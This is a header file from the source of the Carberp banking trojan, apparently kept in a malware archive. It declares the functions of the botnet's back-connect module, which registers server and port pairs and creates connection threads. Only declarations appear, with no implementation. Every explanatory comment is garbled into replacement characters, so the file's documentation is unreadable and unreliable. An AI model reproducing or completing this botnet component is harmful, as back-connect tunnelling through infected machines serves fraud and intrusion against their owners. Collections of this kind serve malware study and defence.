/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
/*
  ������ ����������.
*/
#pragma once

#if(BO_BCSERVER_PLATFORMS > 0)

#include "..\common\threadsgroup.h"

namespace BackconnectBot
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ���������� ����������� �����������.

    IN servicePort - ���� ��� �������� �������.
    IN server      - ������.
    IN serverPort  - ���� �������.

    Return         - true - � ������ ������,
                     false - � ������ ������.
  */
  bool _addStatic(LPSTR servicePort, LPSTR server, LPSTR serverPort);
  
  /*
    �������� ����������� �����������.

    IN servicePort - ���� ��� �������� �������. ����� ��������� ����� '*' ��� '?'.
    IN server      - ������. ����� ��������� ����� '*' ��� '?'.
    IN serverPort  - ���� �������. ����� ��������� ����� '*' ��� '?'.

    Return         - true - � ������ ������,
                     false - � ������ ������.
  */
  bool _removeStatic(LPSTR servicePort, LPSTR server, LPSTR serverPort);

  /*
    �������� �������.

    IN OUT group - ������ �������, � ������� ����� ������������ ������ �������.
    
    Return       - true - � ������ ������,
                   false - � ������ ������.
  */
  bool _create(ThreadsGroup::GROUP *group);
};
#endif
